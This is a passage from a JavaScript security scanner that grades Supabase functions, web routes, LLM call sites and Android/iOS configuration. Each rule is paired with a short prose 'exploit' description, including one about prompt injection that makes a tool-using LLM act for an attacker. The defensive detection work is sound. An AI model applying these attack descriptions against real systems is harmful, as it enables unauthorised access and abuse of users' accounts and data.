      `\`.from(${d.expr})\` is computed at runtime — the tables it reaches cannot be enumerated statically`)
  }
}

function gradeSqlFunctions(model, ledger, findings, allow) {
  ledger.declare('sqlFunctions')
  for (const fn of model.database?.functions || []) {
    const subject = `sql-function:${fn.schema}.${fn.name}`
    if (allow.has(subject)) { ledger.record('sqlFunctions', subject, 'allowlisted', 'user allowlist'); continue }
    const { file, line } = splitAt(fn.at)

    if (!fn.securityDefiner) {
      // Runs as the caller, so RLS still applies. Nothing to bypass.
      ledger.record('sqlFunctions', subject, 'pass', 'security invoker — RLS still applies to the caller')
      continue
    }

    // SECURITY DEFINER runs with the owner's rights and bypasses RLS entirely. Anyone can call
    // it through supabase.rpc(), so the function itself has to do the authorization.
    if (fn.bodyChecksAuth === false) {
      findings.push(finding({
        id: 'CG-DB-004', subject,
        title_en: `SECURITY DEFINER function "${fn.name}" performs no auth check`,
        title_he: `הפונקציה "${fn.name}" מסוג SECURITY DEFINER אינה בודקת הרשאות`,
        severity: 'P0', evidence: 'strong',
        why: 'The function runs with owner privileges, bypassing RLS, and its body never references auth.uid() or auth.jwt().',
        at: firstAt(file, line),
        exploit: 'An anonymous caller invokes supabase.rpc(\'' + fn.name + '\') and operates with owner rights.',
        impact: 'A complete bypass of every RLS policy you wrote, reachable without logging in.',
        guard: 'guard-recipes/rls-policies.md#security-definer',
        cwe: 'CWE-269', owasp: 'A01:2021',
        assumption: 'That authorization is not enforced by something the body calls rather than by auth.uid() directly.',
      }))
      ledger.record('sqlFunctions', subject, 'fail', 'security definer with no auth check in the body')
      continue
    }

    if (!fn.setsSearchPath) {
      findings.push(finding({
        id: 'CG-DB-005', subject,
        title_en: `SECURITY DEFINER function "${fn.name}" does not pin search_path`,
        title_he: `הפונקציה "${fn.name}" מסוג SECURITY DEFINER אינה מקבעת את search_path`,
        severity: 'P1', evidence: 'definitive',
        why: 'The function has no `set search_path`, so an unqualified name inside it resolves through a schema the caller can influence.',
        at: firstAt(file, line),
        exploit: 'An attacker who can create objects in a reachable schema shadows a function the body calls, and it runs with owner rights.',
        impact: 'Privilege escalation to the function owner.',
        guard: 'guard-recipes/rls-policies.md#security-definer',
        cwe: 'CWE-426', autofixable: true,
      }))
      ledger.record('sqlFunctions', subject, 'fail', 'security definer without a pinned search_path')
      continue
    }

    // LAW 1: `bodyChecksAuth === true` means the body mentions auth.uid(). It does not prove the
    // result gates anything, so this is not a pass.
    ledger.record('sqlFunctions', subject, 'undeterminable',
      'security definer that pins search_path and references auth.uid() — whether the check actually gates the body is not verified')
  }
}

function gradeRoutes(model, ledger, findings, allow) {
  ledger.declare('routes')
  const mw = model.middleware || {}
  const mwAuth = !!mw.providesAuth
  const matchers = (mw.matchers || []).map(m => m.matcher)

  for (const r of model.routes || []) {
    // A Next.js route IS a file, so the path identifies it. An Express/Fastify/Nest route is a
    // CALL, and one file declares many — so the method+path is part of the subject or two of them
    // would collide, which LAW 2 treats as two rules disagreeing and throws on.
    const subject = r.routeKey ? `route:${r.file}:${r.routeKey}` : `route:${r.file}`
    if (allow.has(subject)) { ledger.record('routes', subject, 'allowlisted', 'user allowlist'); continue }

    // A call-declared route states its own path literally; only a file-routed one has to be derived.
    const urlPath = r.urlPath || urlPathOf(r.file)
    const mwCovers = mwAuth && (matchers.length ? matchers.some(m => matcherCovers(m, urlPath)) : true)

    // Impact-if-true, decided once: a route holding the service-role key bypasses RLS entirely,
    // so an unauthenticated one is a total compromise rather than a scoped one. "Holding" includes
    // reaching one through an import — the engine's reachesServiceRoleClient — so moving the
    // privileged client into a helper does not downgrade the finding (audit #6).
    const usesServiceRole = r.usesServiceRole || r.reachesServiceRoleClient
    const severity = usesServiceRole ? 'P0' : r.mutating ? 'P1' : 'P2'

    // A route's DISPOSITION is exclusive — exactly one per subject, that is LAW 2. Its FINDINGS
    // are not: an endpoint can be unauthenticated *and* unvalidated *and* unthrottled, and each is
    // separately actionable. An earlier version returned early after the auth verdict, which made
    // every rule below unreachable for exactly the routes that need them most — a login endpoint
    // has no auth check by definition, so it could never be checked for a rate limit.
    if (!r.hasAuthCheck && !mwCovers) {
      // The absence of an auth token in the file is not proof either — the check could live in a
      // helper this route imports. Weak evidence, uncapped severity, needs-review confidence.
      findings.push(finding({
        id: 'CG-WEB-001', subject,
        title_en: `Route ${urlPath} has no visible authentication`,
        title_he: `לנתיב ${urlPath} אין אימות גלוי`,
        severity, evidence: 'weak',
        why: 'Neither the handler nor a middleware matcher that covers this path contains any recognisable authentication.',
        at: firstAt(r.file, r.line ?? null),
        exploit: `Anyone sends ${r.methods.join('/')} to ${urlPath} without logging in.`,
        impact: usesServiceRole
          ? 'The handler reaches the service-role key, which bypasses RLS, so an anonymous caller acts as database owner.'
          : r.mutating
            ? 'An anonymous caller changes data through an endpoint intended for signed-in users.'
            : 'An anonymous caller reads data through an endpoint intended for signed-in users.',
        guard: 'guard-recipes/auth-middleware.md',
        cwe: 'CWE-306', owasp: 'A01:2021',
        assumption: 'That authentication is not performed inside a helper this handler imports, which this pass does not follow.',
      }))
      ledger.record('routes', subject, 'fail', 'no auth token in the handler and no middleware matcher covers it')
    } else {
      // LAW 1 in its purest form. `hasAuthCheck` means the file mentions `getUser` (or similar).
      // An unawaited getUser(), a result never compared, a throw inside a try/catch — all of them
      // look identical from here. Marking this `pass` is precisely the failure this whole design
      // exists to prevent, so it becomes the reviewer's work list instead.
      ledger.record('routes', subject, 'undeterminable',
        mwCovers && !r.hasAuthCheck
          ? `middleware auth covers ${urlPath}, but whether it rejects unauthenticated callers is not verified`
          : 'an authentication call is present, but whether it gates the handler is not verified')
    }

    // Rate limiting and validation are graded independently of auth, because a route can be
    // correctly authenticated and still be the cheapest way to exhaust your budget.
    // Only ask for validation from handlers that actually take input. A mutating route that reads
    // no body has nothing to validate, and flagging it is pure noise.
    if (r.mutating && r.readsBody && !r.hasValidation) {
      findings.push(finding({
        id: 'CG-WEB-002', subject,
        title_en: `Route ${urlPath} does not validate its request body`,
        title_he: `הנתיב ${urlPath} אינו מאמת את גוף הבקשה`,
        severity: 'P2', evidence: 'weak',
        why: 'No schema validation call appears in the handler.',
        at: firstAt(r.file, r.line ?? null),
        exploit: 'A caller sends fields the handler never expected and they flow into the database or a downstream call.',
        impact: 'Mass-assignment and type-confusion bugs, and a much larger surface for every other weakness.',
        guard: 'guard-recipes/zod-validation.md',
        cwe: 'CWE-20',
        assumption: 'That validation is not performed by a helper or a framework layer this pass does not follow.',
      }))
    }

    // Rate limiting is only demanded where its absence is actually exploitable at low cost:
    // credential endpoints, which are the ones that get brute-forced. Asking every mutating route
    // for a limiter would bury the two that matter under a dozen that do not.
    if (/(login|signin|sign-in|signup|sign-up|register|reset|forgot|otp|verify|magic)/i.test(urlPath) && !r.hasRateLimit) {
      findings.push(finding({
        id: 'CG-WEB-003', subject,
        title_en: `Credential endpoint ${urlPath} has no rate limit`,
        title_he: `לנקודת הקצה ${urlPath} לאימות משתמשים אין הגבלת קצב`,
        severity: 'P2', evidence: 'weak',
        why: 'The path looks like a credential endpoint and no rate-limiting call appears in the handler.',
        at: firstAt(r.file, r.line ?? null),
        exploit: 'An attacker submits passwords or one-time codes as fast as the server will answer.',
        impact: 'Credential stuffing and OTP brute force against your users\' accounts.',
        guard: 'guard-recipes/rate-limiting.md',
        cwe: 'CWE-307', owasp: 'A07:2021',
        assumption: 'That rate limiting is not applied at the edge, in middleware, or by your auth provider — many providers include it.',
      }))
    }

    // IDOR, scoped to the ONE case where it is not already handled. With an anon, user-scoped
    // Supabase client, RLS with auth.uid() is the correct and sufficient control, so `.eq('id', id)`
    // is idiomatic rather than broken — flagging it there would flood every correctly-built
    // Supabase app. A service-role client bypasses RLS entirely, so nothing else is watching.
    if (usesServiceRole && r.readsIdParam && !r.ownershipFilter) {
      findings.push(finding({
        id: 'CG-WEB-004', subject,
        title_en: `Route ${urlPath} looks up a record by id with no ownership check`,
        title_he: `הנתיב ${urlPath} מאחזר רשומה לפי מזהה ללא בדיקת בעלות`,
        severity: 'P1', evidence: 'weak',
        why: 'The handler reads an id from the request and holds a service-role client, which bypasses RLS, yet no ownership column is compared anywhere in the file.',
        at: firstAt(r.file, r.line ?? null),
        exploit: 'A signed-in user changes the id in the URL and reads or edits another user\'s record.',
        impact: 'Every record reachable through this route is readable by any caller who can guess an id.',
        guard: 'guard-recipes/auth-middleware.md',
        cwe: 'CWE-639', owasp: 'A01:2021',
        assumption: 'That the ownership check is not performed in a helper this handler calls, which this pass does not follow.',
      }))
    }
  }
}

function gradeLlmSites(model, ledger, findings, allow) {
  ledger.declare('llmSites')
  for (const s of model.llmSites || []) {
    const subject = `llm:${s.file}`
    if (allow.has(subject)) { ledger.record('llmSites', subject, 'allowlisted', 'user allowlist'); continue }

    // A call site's DISPOSITION is exclusive (LAW 2), but its FINDINGS are not: a browser-configured
    // SDK is ALSO unthrottled and unbounded, and each is separately worth reporting. An earlier
    // version returned right after the browser-flag finding, which hid the denial-of-wallet
    // detectors on exactly the worst sites — the ones already leaking the key.
    let browserExposed = false
    if (s.browserFlag) {
      findings.push(finding({
        id: 'CG-LLM-001', subject,
        title_en: 'LLM SDK is configured to run in the browser',
        title_he: 'ה-SDK של המודל מוגדר לרוץ בדפדפן',
        severity: 'P0', evidence: 'definitive',
        why: '`dangerouslyAllowBrowser: true` disables the SDK\'s own guard against shipping an API key to the client.',
        at: firstAt(s.file),
        exploit: 'The API key is in the bundle. Anyone reads it and bills their own usage to your account.',
        impact: 'Unbounded spend on your card, plus full use of your model quota by strangers.',
        guard: 'guard-recipes/llm-guardrails.md#server-proxy',
        owasp: 'LLM06', cwe: 'CWE-200',
      }))
      browserExposed = true
    }

    if (!s.hasRateLimit) {
      // Denial-of-wallet is the most common expensive mistake in this community, and it costs
      // real money on the first night rather than after a breach.
      findings.push(finding({
        id: 'CG-LLM-002', subject,
        title_en: 'LLM call site has no rate limit',
        title_he: 'לנקודת הקריאה למודל אין הגבלת קצב',
        severity: 'P2', evidence: 'weak',
        why: 'No rate-limiting call appears in this file.',
        at: firstAt(s.file),
        exploit: 'Someone loops the endpoint and every call is billed to you.',
        impact: 'Denial of wallet — an overnight bill with no breach involved.',
        guard: 'guard-recipes/rate-limiting.md#llm-endpoints',
        owasp: 'LLM10',
        assumption: 'That rate limiting is not applied at the edge or in middleware, which this pass does not follow.',
      }))
    }
    // No token ceiling means one request can cost an unbounded amount. Cheap to fix, and the
    // failure shows up as a bill rather than a breach, so it is easy to not notice until it is
    // large.
    if (!s.hasMaxTokens) {
      findings.push(finding({
        id: 'CG-LLM-004', subject,
        title_en: 'LLM call has no token ceiling',
        title_he: 'לקריאה למודל אין תקרת טוקנים',
        severity: 'P3', evidence: 'weak',
        why: 'No max_tokens / maxTokens / maxOutputTokens appears at this call site.',
        at: firstAt(s.file),
        exploit: 'A caller crafts input that makes the model generate until it hits the provider limit, on every request.',
        impact: 'Each request costs far more than intended. Combined with a missing rate limit, this is how an overnight bill happens.',
        guard: 'guard-recipes/llm-guardrails.md',
        owasp: 'LLM10',
        assumption: 'That a ceiling is not set on a shared client defined elsewhere.',
      }))
    }
    if (s.buildsPromptFromInput && s.definesTools) {
      findings.push(finding({
        id: 'CG-LLM-003', subject,
        title_en: 'User input reaches a prompt that can call tools',
        title_he: 'קלט משתמש מגיע לפרומפט שיכול להפעיל כלים',
        severity: 'P1', evidence: 'weak',
        why: 'The prompt is built by interpolating request data, and this call site also defines tools the model may invoke.',
        at: firstAt(s.file),
        exploit: 'An attacker writes instructions in their input that the model follows, invoking a tool on their behalf.',
        impact: 'Whatever the tools can do — reading records, sending mail, spending money — an anonymous user can now trigger.',
        guard: 'guard-recipes/llm-guardrails.md#instruction-data-separation',
        owasp: 'LLM01',
        assumption: 'That the interpolated value is genuinely attacker-controlled and not sanitised upstream.',
      }))
    }

    // Disposition: a browser-exposed SDK is a definitive fail; otherwise LAW 1 applies — an auth
    // token in the file does not prove the call site is gated, so it is undeterminable.
    if (browserExposed) {
      ledger.record('llmSites', subject, 'fail', 'dangerouslyAllowBrowser enabled — the SDK ships to the browser')
    } else {
      ledger.record('llmSites', subject, 'undeterminable',
        'server-side call site — whether it is gated and bounded is not verified from source')
    }
  }
}

function gradeSupabaseClients(model, ledger, findings, allow) {
  ledger.declare('supabaseClients')
  const clientReach = new Set(model.boundary?.clientReachable || [])
  const strongClient = new Set((model.boundary?.clientReachableDetail || [])
    .filter(d => d.strength === 'strong').map(d => d.file))

  for (const c of model.supabaseClients || []) {
    const subject = `supabase-client:${c.file}:${c.line}`
    if (allow.has(subject)) { ledger.record('supabaseClients', subject, 'allowlisted', 'user allowlist'); continue }

    if (c.identity === 'service-role' && clientReach.has(c.file)) {
      const strong = strongClient.has(c.file)
      findings.push(finding({
        id: 'CG-DB-006', subject,
        title_en: 'A service-role Supabase client is built in client-reachable code',
        title_he: 'לקוח Supabase עם service-role נבנה בקוד הנגיש מצד הדפדפן',
        severity: 'P0',
        // A strong graph edge is a direct import from a client entrypoint. A weak one went
        // through a barrel, where tree-shaking may drop the module entirely.
        evidence: strong ? 'strong' : 'weak',
        why: strong
          ? 'This module is imported directly by a client entrypoint, and it constructs a client with the service-role key.'
          : 'This module is reachable from a client entrypoint only through a re-export barrel, so the bundler may or may not include it.',
        at: firstAt(c.file, c.line),
        exploit: 'If the module ships, the service-role key is in the bundle and RLS stops mattering for anyone who reads it.',
        impact: 'Complete database access for any visitor.',
        guard: 'guard-recipes/rls-policies.md#service-role-server-only',
        cwe: 'CWE-200', owasp: 'A01:2021',
        assumption: strong ? null : 'That tree-shaking does not drop this module from the client bundle.',
      }))
      ledger.record('supabaseClients', subject, 'fail', 'service-role client reachable from the browser')
      continue
    }

    if (c.identity === 'service-role') {
      // Server-side service-role usage is legitimate and extremely common; it just means RLS is
      // not the control for anything this client touches.
      ledger.record('supabaseClients', subject, 'undeterminable',
        'server-side service-role client — RLS does not apply to it, so its own authorization is not verified here')
      continue
    }

    if (c.identity === 'unknown-key') {
      ledger.record('supabaseClients', subject, 'undeterminable',
        'createClient() with a key this pass could not identify')
      continue
    }

    // Anon / user-scoped clients are the officially recommended pattern, and RLS with auth.uid()
    // is the correct and sufficient control for them. Treating their `.eq('id', id)` calls as
    // IDOR would flood every idiomatic Supabase app with false findings.
    ledger.record('supabaseClients', subject, 'pass', `${c.factory} — user-scoped, RLS is the control`)
  }
}

// ---------------------------------------------------------------------------
// Mobile
//
// Before these rules existed the mobile domain had NO subject set at all, so LAW 2's guarantee
// simply did not extend to it: the report could claim everything was accounted for having never
// opened a manifest. It also forced every mobile finding down the reviewer path, where the best
// available evidence is `judgement` and nothing can reach the verdict. But
// `android:debuggable="true"` is not a judgement — it is a flag with exactly one meaning, and it
// grades `definitive` like any other build-guaranteed fact.
// ---------------------------------------------------------------------------

// Gradle source sets that are NOT compiled into a release build. `npx react-native init` ships
// `android/app/src/debug/AndroidManifest.xml` with `usesCleartextTraffic="true"` so Metro can talk
// to the device, and `androidTest` manifests routinely set debuggable — grading either as if it
// shipped put a `confirmed` finding and a `medium`/`high` verdict on a verbatim framework template.
const NON_RELEASE_SOURCE_SETS = new Set(['debug', 'androidTest', 'test', 'benchmark'])

// A permission is only a boundary if another app cannot simply hold it. `normal` (Android's default
// when protectionLevel is omitted) is granted to every app at install with no prompt, and
// `dangerous` is granted by a user tap — neither keeps anyone out. `checks/android.md` requires a
// signature-level permission.
const SIGNATURE_PROTECTION = /\bsignature\b|\bsignatureOrSystem\b|\bknownSigner\b/i

/**
 * The subject id for one exported component.
 *
 * It used to be `android-component:${file}:${name}`, and `name` falls back to a constant whenever
 * the name attribute cannot be read. Two such components collided, which either swallowed the
 * second row silently (coverage arithmetic short by one) or — when their dispositions differed —
 * threw LAW 2 and produced NO REPORT AT ALL. The id is positional now, so two components can only
 * collide by being the same element.
 */
const componentSubject = (man, c) => `android-component:${man.file}:${c.kind}:${c.line}:${c.name}`

/**
 * Walk every reachable component in one manifest. The mobile equivalent of walking every route.
 * Returns a one-clause summary for the manifest's own ledger note, or null when there are none.
 */
function gradeExportedComponents(man, ledger, findings, allow) {
  const counts = { fail: 0, pass: 0, undeterminable: 0, allowlisted: 0 }
  // `Number(null)` and `Number('')` are both 0, which would read an UNKNOWN targetSdk as "30 or
  // below" and turn an undeterminable row into a confident finding on every manifest that does not
  // state one — which is nearly all of them, since the value normally lives in Gradle.
  const targetSdk = /^\d+$/.test(String(man.targetSdkVersion ?? '')) ? Number(man.targetSdkVersion) : NaN

  for (const c of man.exportedComponents || []) {
    const cs = componentSubject(man, c)
    const record = (disposition, note) => { counts[disposition]++; ledger.record('exportedComponents', cs, disposition, note) }

    if (allow.has(cs)) { record('allowlisted', 'user allowlist'); continue }

    // The home-screen entry point. Every Android app that exists has one, the platform requires it
    // to be exported, and the remediation the old rule handed out — set `exported="false"` or
    // require a permission — makes the app UNLAUNCHABLE. This was the single most damaging false
    // positive in the tool: four untouched framework templates graded `medium` because of it.
    if (c.isLauncher) {
      record('allowlisted', `${c.kind} is the MAIN/LAUNCHER entry point; the platform requires it to be exported`)
      continue
    }

    // `android:exported="@bool/…"` is resolved per build variant, so which one ships is not a fact
    // this tier holds.
    if (c.exportState === 'unresolved') {
      record('undeterminable', `android:exported="${c.exportedAttr}" is a resource reference resolved per build variant — check what the release variant sets`)
      continue
    }

    if (c.permission) {
      // A permission-guarded export is a deliberate, controlled interface — but only if another app
      // cannot simply hold the permission. When this manifest declares it, its protectionLevel is
      // readable, and `normal` (Android's default when omitted) is granted to any app at install
      // with no prompt. That is a checkmark over no guard at all.
      const declared = (man.declaredPermissions || []).find(p => p.name === c.permission)
      if (declared && !SIGNATURE_PROTECTION.test(declared.protectionLevel)) {
        emitExportedComponentFinding(man, c, findings,
          `android:permission="${c.permission}" is declared in this manifest with protectionLevel="${declared.protectionLevel}", which Android grants to any app at install, so the export is not guarded.`)
        record('fail', `${c.kind} exported behind ${c.permission}, whose protectionLevel="${declared.protectionLevel}" is not a boundary`)
        continue
      }
      // Structural pass: the guard is declared in the manifest and enforced by the platform, not
      // inferred from a token in code.
      record('pass', declared
        ? `${c.kind} exported behind ${c.permission} (protectionLevel="${declared.protectionLevel}")`
        : `${c.kind} exported behind the declared permission ${c.permission}`)
      continue
    }

    // Exported BY DEFAULT: an intent-filter and no explicit `android:exported`. `checks/android.md`
    // has always required this case and the engine could not see it, because the old component
    // window stopped before the element's children. Android 12 (targetSdk 31) makes the missing
    // attribute a build error, so a manifest in this state must be targeting 30 or lower — where
    // the filter DOES export it. We cannot read targetSdk from Gradle, so unless the manifest
    // states it, the honest answer is undeterminable rather than a confident finding.
    if (c.exportState === 'default-exported') {
      if (Number.isFinite(targetSdk) && targetSdk <= 30) {
        emitExportedComponentFinding(man, c, findings,
          `the ${c.kind} declares an <intent-filter> and no android:exported, and this manifest targets SDK ${targetSdk}, where that makes it exported to every app on the device.`)
        record('fail', `${c.kind} exported by default through an intent-filter (targetSdk ${targetSdk})`)
      } else {
        record('undeterminable',
          `${c.kind} declares an <intent-filter> and no android:exported — on targetSdk 30 and below that exports it to every app on the device; set android:exported explicitly and confirm which value the release build uses`)
      }
      continue
    }

    emitExportedComponentFinding(man, c, findings,
      'android:exported="true" is set with no android:permission, so any app on the device may invoke it.')
    record('fail', `${c.kind} exported with no permission`)
  }

  const total = Object.values(counts).reduce((a, b) => a + b, 0)
  if (!total) return null
  const parts = Object.entries(counts).filter(([, n]) => n).map(([d, n]) => `${n} ${d}`)
  return `${total} reachable component${total === 1 ? '' : 's'}: ${parts.join(', ')}`
}

function emitExportedComponentFinding(man, c, findings, why) {
  // A content provider hands out data directly, so an unguarded one is worse than an activity.
  findings.push(finding({
    id: 'CG-AND-004', subject: componentSubject(man, c),
    title_en: `Exported ${c.kind} "${c.name}" has no permission guard`,
    title_he: `הרכיב המיוצא "${c.name}" מסוג ${c.kind} אינו מוגן בהרשאה`,
    severity: c.kind === 'provider' ? 'P1' : 'P2', evidence: 'definitive',
    why,
    at: firstAt(man.file, c.line),
    exploit: `A malicious app installed alongside yours invokes this ${c.kind} directly, with no user involvement.`,
    impact: c.kind === 'provider'
      ? 'Any installed app reads or writes the data this provider exposes.'
      : 'Any installed app drives this component, bypassing whatever your UI would have required.',
    guard: 'guard-recipes/network-security-config.md#exported',
    cwe: 'CWE-926', owasp: 'M1',
  }))
}

/**
 * Grade the `res/xml/network_security_config.xml` a manifest points at.
 *
 * Before this the file was never in `artifacts`, never read and never declared, while its mere
 * mention in the manifest bought a `pass` reading "no debuggable, cleartext or backup exposure
 * declared" — over a config permitting cleartext to every host and trusting any CA the phone's
 * owner installs. `checks/android.md` lists both, and the guard recipe is written around this
 * exact file.
 */
function gradeNetworkSecurityConfigs(model, ledger, findings, allow) {
  for (const nsc of model.mobile?.networkSecurityConfigs || []) {
    const subject = `android-network-config:${nsc.file}`
    if (allow.has(subject)) { ledger.record('mobileArtifacts', subject, 'allowlisted', 'user allowlist'); continue }
    if (NON_RELEASE_SOURCE_SETS.has(nsc.sourceSet)) {
      ledger.record('mobileArtifacts', subject, 'allowlisted',
        `src/${nsc.sourceSet} source set — never compiled into a release build`)
      continue
    }
    if (!nsc.readable) {
      ledger.record('mobileArtifacts', subject, 'undeterminable',
        'the manifest points at this network security config and it could not be read — open it and confirm cleartextTrafficPermitted="false" and no <certificates src="user"/>')
      continue
    }

    const problems = []
    if (nsc.baseCleartext) {
      findings.push(finding({
        id: 'CG-AND-002', subject,
        title_en: 'App permits unencrypted HTTP to any host',
        title_he: 'האפליקציה מתירה תעבורת HTTP לא מוצפנת לכל שרת',
        severity: 'P2', evidence: 'definitive',
        why: 'the network security config sets cleartextTrafficPermitted="true" on <base-config>, which applies to every destination.',
        at: firstAt(nsc.file, nsc.baseCleartext.line, '<base-config cleartextTrafficPermitted="true">'),
        exploit: 'Anyone on the same Wi-Fi reads and rewrites the app\'s traffic, including tokens.',
        impact: 'Account takeover and content tampering on any untrusted network.',
        guard: 'guard-recipes/network-security-config.md#cleartext',
        cwe: 'CWE-319', owasp: 'M3', autofixable: true,
      }))
      problems.push('cleartext permitted to every host')
    }
    if (nsc.trustsUserCas) {
      findings.push(finding({
        id: 'CG-AND-005', subject,
        title_en: 'App trusts certificate authorities the phone\'s owner installed',
        title_he: 'האפליקציה סומכת על רשויות אישורים שהותקנו על ידי בעל המכשיר',
        severity: 'P2', evidence: 'definitive',
        why: '<certificates src="user"/> sits outside <debug-overrides>, so the release build trusts any CA added to the device\'s user store.',
        at: firstAt(nsc.file, nsc.trustsUserCas.line, '<certificates src="user" />'),
        exploit: 'Anyone who can get a certificate onto the device — an intercepting proxy, a work profile, a phishing page that asks the user to install a profile — reads and rewrites HTTPS traffic, and nothing about the connection looks wrong.',
        impact: 'HTTPS stops being a control: tokens and request bodies are readable in transit.',
        guard: 'guard-recipes/network-security-config.md#user-cas',
        cwe: 'CWE-295', owasp: 'M3',
      }))
      problems.push('trusts user-installed CAs')
    }

    if (problems.length) { ledger.record('mobileArtifacts', subject, 'fail', problems.join(', ')); continue }
    const scoped = nsc.domainCleartext.flatMap(d => d.domains)
    ledger.record('mobileArtifacts', subject, 'pass', scoped.length
      ? `cleartext scoped to ${scoped.join(', ')}; system trust anchors only`
      : 'cleartext not permitted; no user trust anchors outside debug-overrides')
  }
}

function gradeMobile(model, ledger, findings, allow) {
  ledger.declare('mobileArtifacts')
  ledger.declare('exportedComponents')

  for (const man of model.mobile?.android || []) {
    const subject = `android-manifest:${man.file}`
    if (allow.has(subject)) { ledger.record('mobileArtifacts', subject, 'allowlisted', 'user allowlist'); continue }

    // Debug/test source sets first: none of the release-flag rules below applies to a file that no
    // release build compiles, and running them there is a false positive by construction.
    if (NON_RELEASE_SOURCE_SETS.has(man.sourceSet)) {
      ledger.record('mobileArtifacts', subject, 'allowlisted',
        `src/${man.sourceSet} source set — merged into debug and test builds only, never into a release build`)
      for (const c of man.exportedComponents || []) {
        ledger.record('exportedComponents', componentSubject(man, c), 'allowlisted',
          `declared in the src/${man.sourceSet} source set, which no release build compiles`)
      }
      continue
    }

    // `problems` produce findings and make the manifest row `fail`. `unresolved` produce no finding
    // and make it `undeterminable` — the honest disposition for a value this tier cannot settle.
    const problems = []
    const unresolved = []

    if (man.debuggable?.value === 'true') {
      findings.push(finding({
        id: 'CG-AND-001', subject,
        title_en: 'App is marked debuggable in the manifest',
        title_he: 'האפליקציה מסומנת כניתנת לניפוי שגיאות במניפסט',
        severity: 'P1', evidence: 'definitive',
        why: 'android:debuggable="true" is set, which the build honours as-is.',
        at: firstAt(man.file, man.debuggable.line, 'android:debuggable="true"'),
        exploit: 'Anyone with the installed app attaches a debugger, reads memory and stored data, and steps through your logic.',
        impact: 'Every secret the app holds at runtime — tokens, keys, user data — is readable on any device.',
        guard: 'guard-recipes/network-security-config.md#debuggable',
        cwe: 'CWE-489', owasp: 'M8', autofixable: true,
      }))
      problems.push('debuggable')
    }

    // A value the manifest defers to a build variant (`@bool/cleartext`, `${placeholder}`) is
    // UNKNOWN, not false. Reading it as absent printed "no debuggable, cleartext or backup exposure
    // declared" over a manifest that declares exactly that, conditionally.
    for (const [name, f] of [['debuggable', man.debuggable], ['allowBackup', man.allowBackup],
      ['usesCleartextTraffic', man.usesCleartextTraffic]]) {
      if (f && !f.resolved) {
        unresolved.push(`android:${name}="${f.value}" is a resource reference resolved per build variant — check what the release variant sets`)
      }
    }

    // Cleartext is only a problem when nothing scopes it. A network security config is exactly the
    // mechanism for allowing one legacy host without opening everything — but crediting its mere
    // PRESENCE was LAW 1: a `pass` bought by a token. The referenced file is now resolved and
    // graded as its own subject below; what is left here is the case where nothing scopes it, and
    // the case where the reference names a file this repo does not contain.
    if (man.usesCleartextTraffic?.value === 'true' && !man.networkSecurityConfig) {
      findings.push(finding({
        id: 'CG-AND-002', subject,
        title_en: 'App permits unencrypted HTTP to any host',
        title_he: 'האפליקציה מתירה תעבורת HTTP לא מוצפנת לכל שרת',
        severity: 'P2', evidence: 'definitive',
        why: 'android:usesCleartextTraffic="true" is set and no networkSecurityConfig scopes it to named domains.',
        at: firstAt(man.file, man.usesCleartextTraffic.line, 'android:usesCleartextTraffic="true"'),
        exploit: 'Anyone on the same Wi-Fi reads and rewrites the app\'s traffic, including tokens.',
        impact: 'Account takeover and content tampering on any untrusted network.',
        guard: 'guard-recipes/network-security-config.md#cleartext',
        cwe: 'CWE-319', owasp: 'M3', autofixable: true,
      }))
      problems.push('cleartext')
    } else if (man.networkSecurityConfig && !man.networkSecurityConfigFile) {
      unresolved.push(`networkSecurityConfig="${man.networkSecurityConfig.value}" names a resource this repo does not contain — open it and confirm cleartextTrafficPermitted="false" and no <certificates src="user"/>`)
    }

    // `android:allowBackup` is the platform DEFAULT (`true`), so a manifest that sets it explicitly
    // behaves identically to one that omits it — and the old rule fired on the first and stayed
    // silent on the second, which graded the template author's typing habit rather than the app.
    // It fired on Android Studio's own "Empty Activity" and on Capacitor. Since Android 12 `adb
    // backup` no longer includes app data at all. What is actually worth a human minute is what the
    // backup SET contains, which is what an undeterminable row with an instruction delivers.
    if (man.allowBackup?.value === 'true' || man.allowBackup == null) {
      const scoped = [man.dataExtractionRules && `dataExtractionRules="${man.dataExtractionRules.value}"`,
        man.fullBackupContent && `fullBackupContent="${man.fullBackupContent.value}"`].filter(Boolean)
      unresolved.push(scoped.length
        ? `backup is on (the platform default) and scoped by ${scoped.join(' and ')} — open those rules and confirm tokens and credentials are excluded`
        : 'backup is on (the platform default) and nothing scopes it — set android:allowBackup="false", or add dataExtractionRules that exclude tokens and credentials')
    }

    // Components first, so the manifest's own row can say what happened to them. The old note
    // ("no debuggable, cleartext or backup exposure declared") was emitted verbatim even when that
    // manifest's own components failed in the other set, and read as an all-clear on the artifact.
    const componentOutcome = gradeExportedComponents(man, ledger, findings, allow)

    const note = problems.length ? problems.join(', ')
      : unresolved.length ? unresolved.join('; ')
        : 'no debuggable or cleartext flag set, and android:allowBackup="false"'
    ledger.record('mobileArtifacts', subject,
      problems.length ? 'fail' : unresolved.length ? 'undeterminable' : 'pass',
      componentOutcome ? `${note} (${componentOutcome})` : note)
  }

  gradeNetworkSecurityConfigs(model, ledger, findings, allow)

  for (const pl of model.mobile?.ios || []) {
    const subject = `ios-plist:${pl.file}`
    if (allow.has(subject)) { ledger.record('mobileArtifacts', subject, 'allowlisted', 'user allowlist'); continue }

    // A plist Xcode wrote in the BINARY format — which is what ships inside an IPA — has no
    // textual `<key>X</key><true/>` to read, so every ATS fact came back null and the plist earned
    // a `pass` reading "ATS left at the secure platform default". That checkmark was bought by the
    // file being unreadable, which is the one reason a checkmark may never rest on.
    if (pl.format && pl.format !== 'xml') {
      ledger.record('mobileArtifacts', subject, 'undeterminable',
        `this plist is in ${pl.format === 'binary' ? 'the binary' : 'an unrecognised'} format, which the static tier cannot read — convert it (\`plutil -convert xml1\`) or open it in Xcode and confirm NSAppTransportSecurity, CFBundleURLTypes and any hardcoded values against checks/ios.md`)
      continue
    }

    const problems = []

    // On iOS 10+ NSAllowsArbitraryLoads is IGNORED when any of NSAllowsArbitraryLoadsInWebContent,
    // NSAllowsArbitraryLoadsForMedia or NSAllowsLocalNetworking is present — the narrower key
    // governs instead. So "ATS is off everywhere" stops being a definitive read of the file and
    // becomes a claim about the deployment target, which lives in the pbxproj, not here. Severity
    // is unchanged (impact-if-true is the same); the uncertainty is paid for in evidence, and the
    // finding now names the assumption a five-second check settles.
    const atsOverride = [
      pl.allowsArbitraryLoadsInWebContent?.value === true && 'NSAllowsArbitraryLoadsInWebContent',
      pl.allowsArbitraryLoadsForMedia?.value === true && 'NSAllowsArbitraryLoadsForMedia',
      pl.allowsLocalNetworking?.value === true && 'NSAllowsLocalNetworking',
    ].filter(Boolean)

